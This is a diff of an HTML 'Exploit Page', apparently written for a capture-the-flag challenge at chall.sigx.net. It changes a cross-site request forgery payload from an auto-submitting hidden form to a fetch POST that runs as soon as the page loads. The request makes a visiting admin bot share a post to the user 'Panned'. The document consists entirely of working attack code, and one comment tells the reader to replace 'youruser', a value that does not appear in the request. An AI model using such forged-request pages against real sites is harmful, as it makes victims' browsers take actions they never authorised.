@@ -1,14 +1,31 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>Processing...</h1>
-    <form id="exploitForm" action="http://chall.sigx.net:3104/posts/share" method="POST">
-      <input type="hidden" name="id" value="b05fa630-c18e-11ed-92b6-005d69fad115">
-      <input type="hidden" name="recipient" value="Panned">
-    </form>
-
+<head>
+    <title>Exploit Page</title>
+</head>
+<body>
+    <h1>Processing, please wait...</h1>
     <script>
-      // Automatically submit the form as soon as the admin bot loads the page
-      document.getElementById('exploitForm').submit();
+        // This function runs automatically
+        async function exploit() {
+            try {
+                await fetch('http://chall.sigx.net:3104/posts/share', {
+                    method: 'POST',
+                    mode: 'no-cors', 
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    // REPLACE 'youruser' with your actual 6-10 character username
+                    body: 'id=b05fa630-c18e-11ed-92b6-005d69fad115&recipient=Panned'
+                });
+                console.log("Request sent!");
+            } catch (e) {
+                console.error("Failed to send:", e);
+            }
+        }
+
+        // Execute the exploit immediately
+        exploit();
     </script>
-  </body>
+</body>
 </html>
